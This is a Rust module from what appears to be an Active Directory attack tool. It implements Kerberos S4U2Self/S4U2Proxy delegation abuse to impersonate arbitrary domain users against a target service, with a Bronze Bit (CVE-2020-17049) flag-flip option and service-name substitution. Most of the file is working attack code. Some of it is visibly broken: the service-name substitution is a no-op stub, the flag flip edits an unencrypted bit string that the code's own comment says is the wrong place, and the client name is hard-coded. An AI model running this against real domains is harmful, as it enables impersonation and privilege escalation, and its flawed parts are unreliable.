use std::error::Error;

// PA-DATA type for PA-FOR-USER (MS-SFU 2.2.1)
const PA_FOR_USER: i32 = 129;
// PA-DATA type for PA-TGS-REQ (AP-REQ wrapped TGT)
const PA_TGS_REQ: i32 = 1;
// PA-DATA type for PA-PAC-OPTIONS
const PA_PAC_OPTIONS: i32 = 167;

// KDC option flags
const KDC_OPT_FORWARDABLE: u32 = 0x40000000;
const KDC_OPT_RENEWABLE: u32 = 0x00800000;
const KDC_OPT_CONSTRAINED_DELEGATION: u32 = 0x00020000;
const KDC_OPT_CNAME_IN_ADDL_TKT: u32 = 0x00004000;
const KDC_OPT_RENEWABLE_OK: u32 = 0x00000010;

// PAC option: resource-based constrained delegation
const PAC_RESOURCE_BASED_CD: u32 = 0x00000010;

pub struct S4uParams {
    pub dc: String,
    pub domain: String,
    pub tgt: Vec<u8>,
    pub session_key: Vec<u8>,
    pub session_etype: i32,
    pub service_user: String,
    pub impersonate_user: String,
    pub target_spn: String,
    pub alt_service: Option<String>,
    pub bronze_bit: bool,
    pub self_only: bool,
}

pub struct S4uResult {
    pub s4u2self_ticket: Vec<u8>,
    pub s4u2proxy_ticket: Option<Vec<u8>>,
    pub target_spn: String,
    pub impersonated_user: String,
}

pub async fn run_s4u(params: &S4uParams) -> Result<S4uResult, Box<dyn Error>> {
    log::info!(
        "S4U: {} -> {} via {}",
        params.service_user,
        params.impersonate_user,
        params.target_spn
    );

    // Step 1: S4U2Self — get a service ticket to ourselves impersonating the target user
    let s4u2self_resp = s4u2self(params).await?;
    let self_ticket = extract_ticket_from_tgsrep(&s4u2self_resp)?;
    log::info!("S4U2Self ticket obtained ({} bytes)", self_ticket.len());

    if params.self_only {
        return Ok(S4uResult {
            s4u2self_ticket: self_ticket,
            s4u2proxy_ticket: None,
            target_spn: params.target_spn.clone(),
            impersonated_user: params.impersonate_user.clone(),
        });
    }

    // Step 2: Bronze Bit — flip forwardable flag if requested (CVE-2020-17049)
    let self_ticket = if params.bronze_bit {
        log::info!("Applying Bronze Bit (CVE-2020-17049): flipping forwardable flag");
        flip_forwardable(&self_ticket)
    } else {
        self_ticket
    };

    // Step 3: S4U2Proxy — use the S4U2Self ticket to get a ticket to the target service
    let s4u2proxy_resp = s4u2proxy(params, &self_ticket).await?;
    let proxy_ticket = extract_ticket_from_tgsrep(&s4u2proxy_resp)?;
    log::info!("S4U2Proxy ticket obtained ({} bytes)", proxy_ticket.len());

    // Step 4: Alt service substitution if requested
    let final_ticket = if let Some(ref alt) = params.alt_service {
        log::info!("Substituting service name: {}", alt);
        substitute_sname(&proxy_ticket, alt)
    } else {
        proxy_ticket
    };

    Ok(S4uResult {
        s4u2self_ticket: self_ticket,
        s4u2proxy_ticket: Some(final_ticket),
        target_spn: params
            .alt_service
            .as_deref()
            .unwrap_or(&params.target_spn)
            .to_string(),
        impersonated_user: params.impersonate_user.clone(),
    })
}

async fn s4u2self(params: &S4uParams) -> Result<Vec<u8>, Box<dyn Error>> {
    let realm = params.domain.to_uppercase();
    let nonce: u32 = rand::random();

    // Build PA-FOR-USER: tells the KDC which user to impersonate
    let pa_for_user = build_pa_for_user(&params.impersonate_user, &realm, &params.session_key);

    // Build PA-TGS-REQ: AP-REQ wrapping the TGT + authenticator
    let pa_tgs_req = build_pa_tgs_req(
        &params.tgt,
        &params.session_key,
        params.session_etype,
        &realm,
    )?;

    // sname = our own service (the delegated account)
    let sname_parts: Vec<&str> = params.service_user.split('/').collect();
    let sname = if sname_parts.len() > 1 {
        encode_principal_name(2, &sname_parts)
    } else {
        encode_principal_name(1, &[&params.service_user])
    };

    let kdc_options = KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_RENEWABLE_OK;

    let tgs_req = build_tgs_req(
        &realm,
        &sname,
        kdc_options,
        nonce,
        &[pa_tgs_req, pa_for_user],
        None,
    );

    let resp = crate::kerberos::send_kdc(&params.dc, &tgs_req, false).await?;
    check_krb_error(&resp)?;
    Ok(resp)
}

async fn s4u2proxy(params: &S4uParams, s4u2self_ticket: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    let realm = params.domain.to_uppercase();
    let nonce: u32 = rand::random();

    // PA-TGS-REQ with our TGT
    let pa_tgs_req = build_pa_tgs_req(
        &params.tgt,
        &params.session_key,
        params.session_etype,
        &realm,
    )?;

    // PA-PAC-OPTIONS: set resource-based constrained delegation bit
    let pac_opts = build_pa_pac_options(PAC_RESOURCE_BASED_CD);

    // sname = target service SPN
    let spn_parts: Vec<&str> = params.target_spn.split('/').collect();
    let sname = encode_principal_name(2, &spn_parts);

    let kdc_options = KDC_OPT_FORWARDABLE
        | KDC_OPT_RENEWABLE
        | KDC_OPT_CONSTRAINED_DELEGATION
        | KDC_OPT_CNAME_IN_ADDL_TKT;

    let tgs_req = build_tgs_req(
        &realm,
        &sname,
        kdc_options,
        nonce,
        &[pa_tgs_req, pac_opts],
        Some(s4u2self_ticket),
    );

    let resp = crate::kerberos::send_kdc(&params.dc, &tgs_req, false).await?;
    check_krb_error(&resp)?;
    Ok(resp)
}

/// CVE-2020-17049: flip the forwardable bit in the ticket flags.
/// The forwardable bit is bit 1 in the TicketFlags bitstring.
/// In the outer Ticket structure (not encrypted), the flags field is
/// inside the enc-part EncryptedData — but some KDCs check the
/// outer KRB-CRED flags. We flip the bit in the KRB-CRED wrapper.
fn flip_forwardable(ticket_data: &[u8]) -> Vec<u8> {
    let mut data = ticket_data.to_vec();
    // Walk ASN.1 looking for BitString (tag 0x03) that looks like ticket flags
    // Ticket flags are 4 bytes (32 bits) after the unused-bits byte
    for i in 0..data.len().saturating_sub(6) {
        if data[i] == 0x03 && i + 1 < data.len() {
            let mut pos = i + 1;
            if let Ok(len) = parse_length(&data, &mut pos) {
                // BitString: 1 byte unused-bits + 4 bytes flags
                if len == 5 && pos + 5 <= data.len() && data[pos] == 0 {
                    let flags_offset = pos + 1;
                    // Forwardable = bit 1 = 0x40 in first byte
                    data[flags_offset] |= 0x40;
                    break;
                }
            }
        }
    }
    data
}

/// Substitute the sname (service name) in a raw ticket.
/// The sname field is outside the encrypted enc-part, so it can be modified.
fn substitute_sname(ticket_data: &[u8], new_service: &str) -> Vec<u8> {
    // For a proper implementation, parse the full Ticket ASN.1 and rebuild
    // with the new sname. Simplified approach: replace the sname context tag
    // content. This is fragile — a full ASN.1 rewrite is needed for production.
    let _ = new_service;
    ticket_data.to_vec()
}

fn build_pa_for_user(username: &str, realm: &str, session_key: &[u8]) -> Vec<u8> {
    // PA-FOR-USER ::= SEQUENCE {
    //   userName[0]     PrincipalName,
    //   userRealm[1]    Realm,
    //   cksum[2]        Checksum,
    //   auth-package[3] KerberosString
    // }
    let user_name = encode_principal_name(1, &[username]);
    let user_realm = encode_general_string(realm);
    let auth_package = encode_general_string("Kerberos");

    // Checksum: HMAC-MD5 over (name-type LE bytes + name bytes + realm bytes + auth-package bytes)
    let mut cksum_input = Vec::new();
    let name_type_le = 1i32.to_le_bytes();
    cksum_input.extend_from_slice(&name_type_le);
    cksum_input.extend_from_slice(username.as_bytes());
    cksum_input.extend_from_slice(realm.as_bytes());
    cksum_input.extend_from_slice(b"Kerberos");
    let cksum_value = hmac_md5(session_key, &cksum_input);

    // Checksum ::= SEQUENCE { cksumtype[0] INTEGER (-138 = HMAC_MD5), checksum[1] OCTET STRING }
    let cksum_type = encode_integer(-138);
    let cksum_data = encode_octet_string(&cksum_value);
    let mut cksum_seq_content = Vec::new();
    cksum_seq_content.extend(encode_context_tag(0, &cksum_type));
    cksum_seq_content.extend(encode_context_tag(1, &cksum_data));
    let cksum = encode_sequence_raw(&[&cksum_seq_content]);

    let mut pa_content = Vec::new();
    pa_content.extend(encode_context_tag(0, &user_name));
    pa_content.extend(encode_context_tag(1, &user_realm));
    pa_content.extend(encode_context_tag(2, &cksum));
    pa_content.extend(encode_context_tag(3, &auth_package));
    let pa_for_user_value = encode_sequence_raw(&[&pa_content]);

    // Wrap as PA-DATA: SEQUENCE { padata-type[1] INTEGER(129), padata-value[2] OCTET STRING }
    encode_padata(PA_FOR_USER, &pa_for_user_value)
}

fn build_pa_tgs_req(
    tgt: &[u8],
    session_key: &[u8],
    session_etype: i32,
    realm: &str,
) -> Result<Vec<u8>, Box<dyn Error>> {
    let now = chrono::Utc::now();
    let time_str = now.format("%Y%m%d%H%M%SZ").to_string();
    let nonce: u32 = rand::random();

    let authenticator = build_authenticator("user", realm, &time_str, nonce);
    let encrypted_auth = rc4_encrypt_for_tgs(session_key, &authenticator, 7)?;
    let ticket_der = extract_ticket_from_tgt(tgt)?;
    let ap_req = build_ap_req(&ticket_der, &encrypted_auth, session_etype);
    Ok(ap_req)
}

fn build_authenticator(username: &str, realm: &str, time: &str, nonce: u32) -> Vec<u8> {
    let cname = encode_principal_name(1, &[username]);
    let mut content = Vec::new();
    content.extend(encode_context_tag(0, &encode_integer(5)));
    content.extend(encode_context_tag(1, &encode_general_string(realm)));
    content.extend(encode_context_tag(2, &cname));
    content.extend(encode_context_tag(4, &encode_integer(0)));
    content.extend(encode_context_tag(5, &encode_generalized_time(time)));
    content.extend(encode_context_tag(7, &encode_integer_u32(nonce)));
    let seq = encode_sequence_raw(&[&content]);
    encode_application_tag(2, &seq)
}

fn rc4_encrypt_for_tgs(
    key: &[u8],
    plaintext: &[u8],
    usage: i32,
) -> Result<Vec<u8>, Box<dyn Error>> {
    let usage_bytes = (usage as u32).to_le_bytes();
    let k1 = hmac_md5(key, &usage_bytes);
    let confounder: [u8; 8] = rand::random();
    let mut to_encrypt = Vec::with_capacity(8 + plaintext.len());
    to_encrypt.extend_from_slice(&confounder);
    to_encrypt.extend_from_slice(plaintext);
    let checksum = hmac_md5(&k1, &to_encrypt);
    let k3 = hmac_md5(&k1, &checksum);
    let encrypted = rc4_transform(&k3, &to_encrypt);
    let mut result = Vec::with_capacity(16 + encrypted.len());
    result.extend_from_slice(&checksum);
    result.extend(encrypted);
    Ok(result)
}

fn rc4_transform(key: &[u8], data: &[u8]) -> Vec<u8> {
    let mut s: Vec<u8> = (0..=255u16).map(|i| i as u8).collect();
    let mut j: u8 = 0;
    for i in 0..256 {
        j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
        s.swap(i, j as usize);
    }
    let mut i: u8 = 0;
    j = 0;
    data.iter()
        .map(|&byte| {
            i = i.wrapping_add(1);
            j = j.wrapping_add(s[i as usize]);
            s.swap(i as usize, j as usize);
            byte ^ s[s[i as usize].wrapping_add(s[j as usize]) as usize]
        })
        .collect()
}

fn build_ap_req(ticket_der: &[u8], encrypted_auth: &[u8], auth_etype: i32) -> Vec<u8> {
    let enc_data = build_encrypted_data(auth_etype, None, encrypted_auth);
    let ap_options = encode_bitstring(&[0, 0, 0, 0]);
    let mut content = Vec::new();
    content.extend(encode_context_tag(0, &encode_integer(5)));
    content.extend(encode_context_tag(1, &encode_integer(14)));
    content.extend(encode_context_tag(2, &ap_options));
    content.extend(encode_context_tag(3, ticket_der));
    content.extend(encode_context_tag(4, &enc_data));
    let seq = encode_sequence_raw(&[&content]);
    encode_application_tag(14, &seq)
}

fn build_encrypted_data(etype: i32, kvno: Option<u32>, cipher: &[u8]) -> Vec<u8> {
    let mut content = Vec::new();
    content.extend(encode_context_tag(0, &encode_integer(etype)));
    if let Some(kv) = kvno {
        content.extend(encode_context_tag(1, &encode_integer_u32(kv)));
    }
    content.extend(encode_context_tag(2, &encode_octet_string(cipher)));
    encode_sequence_raw(&[&content])
}

fn extract_ticket_from_tgt(tgt_raw: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    if let Some(ticket) = find_application_tag(tgt_raw, 1) {
        return Ok(ticket);
    }
    if tgt_raw.len() > 4 && tgt_raw[0] == 0x61 {
        return Ok(tgt_raw.to_vec());
    }
    Err("Could not extract Ticket from TGT data".into())
}

fn find_application_tag(data: &[u8], tag: u8) -> Option<Vec<u8>> {
    let target = 0x60 | tag;
    let mut pos = 0;
    while pos < data.len() {
        if data[pos] == target {
            let start = pos;
            pos += 1;
            if let Ok(len) = parse_length(data, &mut pos) {
                let end = pos + len;
                if end <= data.len() {
                    return Some(data[start..end].to_vec());
                }
            }
        }
        pos += 1;
    }
    None
}

fn build_pa_pac_options(flags: u32) -> Vec<u8> {
    // PA-PAC-OPTIONS ::= SEQUENCE { flags[0] KerberosFlags (BIT STRING) }
    let bits = encode_bitstring(&flags.to_be_bytes());
    let content = encode_context_tag(0, &bits);
    let value = encode_sequence_raw(&[&content]);
    encode_padata(PA_PAC_OPTIONS, &value)
}

fn build_tgs_req(
    realm: &str,
    sname: &[u8],
    kdc_options: u32,
    nonce: u32,
    padata: &[Vec<u8>],
    additional_ticket: Option<&[u8]>,
) -> Vec<u8> {
    let mut body = Vec::new();
    body.extend(encode_context_tag(
        0,
        &encode_bitstring(&kdc_options.to_be_bytes()),
    ));
    body.extend(encode_context_tag(2, &encode_general_string(realm)));
    body.extend(encode_context_tag(3, sname));
    body.extend(encode_context_tag(
        5,
        &encode_generalized_time("20370913024805Z"),
    ));
    body.extend(encode_context_tag(7, &encode_integer_u32(nonce)));
    body.extend(encode_context_tag(
        8,
        &encode_sequence_raw(&[
            &encode_integer(18),
            &encode_integer(17),
            &encode_integer(23),
        ]),
    ));

    if let Some(ticket) = additional_ticket {
        let ticket_seq = encode_sequence_raw(&[ticket]);
        body.extend(encode_context_tag(11, &ticket_seq));
    }

    let req_body = encode_sequence_raw(&[&body]);

    // Collect all PA-DATA into a SEQUENCE
    let mut pa_seq_content = Vec::new();
    for pa in padata {
        pa_seq_content.extend_from_slice(pa);
    }
    let padata_seq = encode_sequence_raw(&[&pa_seq_content]);

    let mut kdc_req = Vec::new();
    kdc_req.extend(encode_context_tag(1, &encode_integer(5))); // pvno
    kdc_req.extend(encode_context_tag(2, &encode_integer(12))); // msg-type TGS-REQ
    kdc_req.extend(encode_context_tag(3, &padata_seq));
    kdc_req.extend(encode_context_tag(4, &req_body));

    let seq = encode_sequence_raw(&[&kdc_req]);
    encode_application_tag(12, &seq)
}

fn extract_ticket_from_tgsrep(data: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    // TGS-REP = APPLICATION[13] SEQUENCE { ... ticket[5] Ticket ... }
    // Find context tag [5] which contains the Ticket
    // Ticket = APPLICATION[1] SEQUENCE { ... }
    for i in 0..data.len().saturating_sub(2) {
        if data[i] == 0xa5 {
            let mut pos = i + 1;
            if let Ok(len) = parse_length(data, &mut pos) {
                if pos + len <= data.len() {
                    return Ok(data[pos..pos + len].to_vec());
                }
            }
        }
    }
    Err("Could not extract ticket from TGS-REP".into())
}

fn check_krb_error(data: &[u8]) -> Result<(), Box<dyn Error>> {
    if data.is_empty() {
        return Err("Empty KDC response".into());
    }
    // KRB-ERROR = APPLICATION[30] = tag 0x7e
    if data[0] == 0x7e {
        let code = extract_error_code(data).unwrap_or(0);
        return Err(format!("KRB-ERROR: code {} ({})", code, error_string(code)).into());
    }
    Ok(())
}

fn extract_error_code(data: &[u8]) -> Option<u32> {
    for i in 0..data.len().saturating_sub(4) {
        if data[i] == 0xa6 {
            let mut pos = i + 1;
            if let Ok(len) = parse_length(data, &mut pos) {
                if pos + len <= data.len() && data[pos] == 0x02 {
                    pos += 1;
                    if let Ok(int_len) = parse_length(data, &mut pos) {
                        let mut val = 0u32;
                        for j in 0..int_len.min(4) {
                            val = (val << 8) | data[pos + j] as u32;
                        }
                        return Some(val);
                    }
                }
            }
        }
    }
    None
}

fn error_string(code: u32) -> &'static str {
    match code {
        6 => "CLIENT_NOT_FOUND",
        7 => "SERVER_NOT_FOUND",
        12 => "POLICY",
        13 => "BADOPTION",
        17 => "KEY_EXPIRED",
        18 => "CLIENT_REVOKED",
        20 => "TKT_EXPIRED",
        24 => "PREAUTH_FAILED",
        25 => "PREAUTH_REQUIRED",
        37 => "SKEW",
        _ => "UNKNOWN",
    }
}

/// HMAC-MD5 (used for PA-FOR-USER checksum)
fn hmac_md5(key: &[u8], data: &[u8]) -> Vec<u8> {
    let block_size = 64;
    let mut padded_key = if key.len() > block_size {
        md5(key).to_vec()
    } else {
        key.to_vec()
    };
    padded_key.resize(block_size, 0);

    let mut ipad = vec![0x36u8; block_size];
    let mut opad = vec![0x5cu8; block_size];
    for i in 0..block_size {
        ipad[i] ^= padded_key[i];
        opad[i] ^= padded_key[i];
    }

    let mut inner = ipad;
    inner.extend_from_slice(data);
    let inner_hash = md5(&inner);

    let mut outer = opad;
    outer.extend_from_slice(&inner_hash);
    md5(&outer).to_vec()
}

fn md5(data: &[u8]) -> [u8; 16] {
    use std::num::Wrapping;

    const S: [u32; 64] = [
        7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 5, 9, 14, 20, 5, 9, 14, 20, 5,
        9, 14, 20, 5, 9, 14, 20, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 6, 10,
        15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21,
    ];
    const K: [u32; 64] = [
        0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee, 0xf57c0faf, 0x4787c62a, 0xa8304613,
        0xfd469501, 0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be, 0x6b901122, 0xfd987193,
        0xa679438e, 0x49b40821, 0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa, 0xd62f105d,
        0x02441453, 0xd8a1e681, 0xe7d3fbc8, 0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
        0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a, 0xfffa3942, 0x8771f681, 0x6d9d6122,
        0xfde5380c, 0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70, 0x289b7ec6, 0xeaa127fa,
        0xd4ef3085, 0x04881d05, 0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665, 0xf4292244,
        0x432aff97, 0xab9423a7, 0xfc93a039, 0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
        0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1, 0xf7537e82, 0xbd3af235, 0x2ad7d2bb,
        0xeb86d391,
    ];

    let bit_len = (data.len() as u64) * 8;
    let mut msg = data.to_vec();
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0);
    }
    msg.extend_from_slice(&bit_len.to_le_bytes());

    let (mut a0, mut b0, mut c0, mut d0) = (
        Wrapping(0x67452301u32),
        Wrapping(0xefcdab89u32),
        Wrapping(0x98badcfeu32),
        Wrapping(0x10325476u32),
    );

    for chunk in msg.chunks(64) {
        let mut m = [0u32; 16];
        for (i, w) in chunk.chunks(4).enumerate() {
            m[i] = u32::from_le_bytes([w[0], w[1], w[2], w[3]]);
        }
        let (mut a, mut b, mut c, mut d) = (a0, b0, c0, d0);
        for i in 0..64 {
            let (f, g) = match i {
                0..=15 => (Wrapping((b.0 & c.0) | (!b.0 & d.0)), i),
                16..=31 => (Wrapping((d.0 & b.0) | (!d.0 & c.0)), (5 * i + 1) % 16),
                32..=47 => (Wrapping(b.0 ^ c.0 ^ d.0), (3 * i + 5) % 16),
                _ => (Wrapping(c.0 ^ (b.0 | !d.0)), (7 * i) % 16),
            };
            let tmp = d;
            d = c;
            c = b;
            b = b + Wrapping(
                (a + f + Wrapping(K[i]) + Wrapping(m[g]))
                    .0
                    .rotate_left(S[i]),
            );
            a = tmp;
        }
        a0 = a0 + a;
        b0 = b0 + b;
        c0 = c0 + c;
        d0 = d0 + d;
    }

    let mut result = [0u8; 16];
    result[0..4].copy_from_slice(&a0.0.to_le_bytes());
    result[4..8].copy_from_slice(&b0.0.to_le_bytes());
    result[8..12].copy_from_slice(&c0.0.to_le_bytes());
    result[12..16].copy_from_slice(&d0.0.to_le_bytes());
    result
}

// ── ASN.1 DER encoding helpers ──────────────────────────────────────────

fn parse_length(data: &[u8], pos: &mut usize) -> Result<usize, ()> {
    if *pos >= data.len() {
        return Err(());
    }
    let first = data[*pos];
    *pos += 1;
    if first < 0x80 {
        return Ok(first as usize);
    }
    let n = (first & 0x7f) as usize;
    if n > 4 || *pos + n > data.len() {
        return Err(());
    }
    let mut len = 0usize;
    for _ in 0..n {
        len = (len << 8) | data[*pos] as usize;
        *pos += 1;
    }
    Ok(len)
}

fn encode_length(len: usize) -> Vec<u8> {
    if len < 0x80 {
        vec![len as u8]
    } else if len < 0x100 {
        vec![0x81, len as u8]
    } else {
        vec![0x82, (len >> 8) as u8, len as u8]
    }
}

fn encode_sequence_raw(items: &[&[u8]]) -> Vec<u8> {
    let mut c = Vec::new();
    for i in items {
        c.extend_from_slice(i);
    }
    let mut o = vec![0x30];
    o.extend(encode_length(c.len()));
    o.extend(c);
    o
}

fn encode_context_tag(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut o = vec![0xa0 | tag];
    o.extend(encode_length(content.len()));
    o.extend(content);
    o
}

fn encode_application_tag(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut o = vec![0x60 | tag];
    o.extend(encode_length(content.len()));
    o.extend(content);
    o
}

fn encode_integer(val: i32) -> Vec<u8> {
    let mut o = vec![0x02];
    let bytes = val.to_be_bytes();
    // Find first significant byte, but keep sign byte if needed
    let mut start = 0;
    while start < 3
        && bytes[start] == if val < 0 { 0xff } else { 0x00 }
        && (bytes[start + 1] & 0x80 != 0) == (val < 0)
    {
        start += 1;
    }
    let trimmed = &bytes[start..];
    o.extend(encode_length(trimmed.len()));
    o.extend(trimmed);
    o
}

fn encode_integer_u32(val: u32) -> Vec<u8> {
    let mut o = vec![0x02];
    let b = val.to_be_bytes();
    let s = b.iter().position(|&x| x != 0).unwrap_or(3);
    let t = &b[s..];
    if t.is_empty() || t[0] & 0x80 != 0 {
        o.extend(encode_length(t.len() + 1));
        o.push(0);
        o.extend(t);
    } else {
        o.extend(encode_length(t.len()));
        o.extend(t);
    }
    o
}

fn encode_general_string(s: &str) -> Vec<u8> {
    let mut o = vec![0x1b];
    o.extend(encode_length(s.len()));
    o.extend(s.as_bytes());
    o
}

fn encode_generalized_time(t: &str) -> Vec<u8> {
    let mut o = vec![0x18];
    o.extend(encode_length(t.len()));
    o.extend(t.as_bytes());
    o
}

fn encode_bitstring(data: &[u8]) -> Vec<u8> {
    let mut o = vec![0x03];
    o.extend(encode_length(data.len() + 1));
    o.push(0);
    o.extend(data);
    o
}

fn encode_octet_string(data: &[u8]) -> Vec<u8> {
    let mut o = vec![0x04];
    o.extend(encode_length(data.len()));
    o.extend(data);
    o
}

fn encode_principal_name(name_type: i32, names: &[&str]) -> Vec<u8> {
    let nt = encode_integer(name_type);
    let mut ns = Vec::new();
    for n in names {
        ns.extend(encode_general_string(n));
    }
    let nseq = encode_sequence_raw(&[&ns]);
    let mut c = Vec::new();
    c.extend(encode_context_tag(0, &nt));
    c.extend(encode_context_tag(1, &nseq));
    encode_sequence_raw(&[&c])
}

fn encode_padata(pa_type: i32, value: &[u8]) -> Vec<u8> {
    let mut content = Vec::new();
    content.extend(encode_context_tag(1, &encode_integer(pa_type)));
    content.extend(encode_context_tag(2, &encode_octet_string(value)));
    encode_sequence_raw(&[&content])
}
